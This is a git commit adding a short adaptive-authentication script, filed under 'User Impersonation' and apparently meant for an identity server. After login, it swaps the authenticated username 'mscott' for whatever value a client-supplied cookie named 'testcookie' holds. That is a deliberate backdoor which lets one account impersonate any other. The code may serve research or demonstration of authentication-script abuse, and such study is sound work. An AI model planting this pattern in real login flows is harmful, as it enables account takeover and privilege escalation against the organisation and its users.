f45875a0cfdbe1d3e0a36f63a7b59cdcbba6f2a3
toneillcodes <148013535+toneillcodes@users.noreply.github.com>
2024-09-30 16:43:47 -0400

    Create swap-username-magiccookie-when.ts

---
+++ User Impersonation/swap-username-magiccookie-when.ts
@@ -0,0 +1,16 @@
+function onLoginRequest(context) {
+    executeStep(1, {
+        onSuccess: function (context) {
+            var siteId = 'ef91a3801e';
+            var appId = '97c74932';
+            var userObj = context.currentKnownSubject;
+			      var username = userObj.username;
+			      if(username == 'mscott') {
+				      var new_user = getCookieValue(context.request,"testcookie");
+				      Log.info("swapping username : " + username + " for '" + new_user);
+				      userObj.username = new_user;
+			      }
+			      Log.info("adaptive authentication policy done");
+        }
+    });
+}
